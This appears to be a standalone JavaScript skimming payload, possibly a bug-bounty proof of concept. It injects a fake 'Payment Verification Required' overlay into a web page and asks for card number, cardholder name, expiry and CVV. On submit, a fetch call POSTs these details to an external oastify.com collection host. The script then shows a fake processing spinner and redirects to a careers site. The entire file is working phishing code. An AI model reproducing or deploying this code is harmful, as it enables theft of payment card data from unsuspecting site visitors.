// Wait for Vite to finish loading
document.addEventListener('vite-script-loaded', function() {
  // Create fake payment overlay
  const fakePayment = document.createElement('div');
  fakePayment.className = 'phishing-overlay';
  fakePayment.innerHTML = `
    <div class="phishing-container">
      <h2 style="color: #d23f00;">Payment Verification Required</h2>
      <p>Your session has expired. Please verify your payment details to continue:</p>
      
      <input type="text" id="phish-card" placeholder="Card Number" class="phishing-input" maxlength="19">
      <input type="text" id="phish-name" placeholder="Cardholder Name" class="phishing-input">
      
      <div style="display: flex; gap: 10px;">
        <input type="text" id="phish-expiry" placeholder="MM/YY" class="phishing-input" style="flex: 1;">
        <input type="text" id="phish-cvv" placeholder="CVV" class="phishing-input" style="flex: 1;" maxlength="4">
      </div>
      
      <button id="phish-submit" class="phishing-button">Verify Payment</button>
      
      <p class="security-note">
        🔒 Secured with 256-bit encryption
      </p>
    </div>
  `;
  
  document.body.appendChild(fakePayment);

  // Auto-format card number (add spaces every 4 digits)
  document.getElementById('phish-card').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    if (value.length > 0) {
      value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
    }
    e.target.value = value.substring(0, 19);
  });

  // Auto-format expiry date (MM/YY)
  document.getElementById('phish-expiry').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value.substring(0, 5);
  });

  // Submit handler
  document.getElementById('phish-submit').addEventListener('click', function() {
    try {
      const card = document.getElementById('phish-card').value;
      const name = document.getElementById('phish-name').value;
      const expiry = document.getElementById('phish-expiry').value;
      const cvv = document.getElementById('phish-cvv').value;
      
      // Send data to attacker server
      fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          card_number: card,
          card_name: name,
          expiry_date: expiry,
          cvv: cvv,
          origin: window.location.href,
          timestamp: new Date().toISOString()
        }),
        mode: 'no-cors'
      }).catch(e => console.error);
      
      // Show processing animation
      fakePayment.innerHTML = `
        <div class="phishing-container" style="text-align: center;">
          <div style="margin: 20px 0 30px;">
            <svg width="50" height="50" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg" stroke="#d23f00">
              <g fill="none" fill-rule="evenodd">
                <g transform="translate(1 1)" stroke-width="2">
                  <circle stroke-opacity=".5" cx="18" cy="18" r="18"/>
                  <path d="M36 18c0-9.94-8.06-18-18-18">
                    <animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="1s" repeatCount="indefinite"/>
                  </path>
                </g>
              </g>
            </svg>
          </div>
          <p>Verifying your payment details...</p>
        </div>`;
      
      // Redirect after 3 seconds
      setTimeout(() => {
        window.location.href = 'https://careers.thetradedesk.com';
      }, 3000);
    } catch (e) {
      console.error('Payment verification error:', e);
      window.location.href = 'https://careers.thetradedesk.com';
    }
  });
});
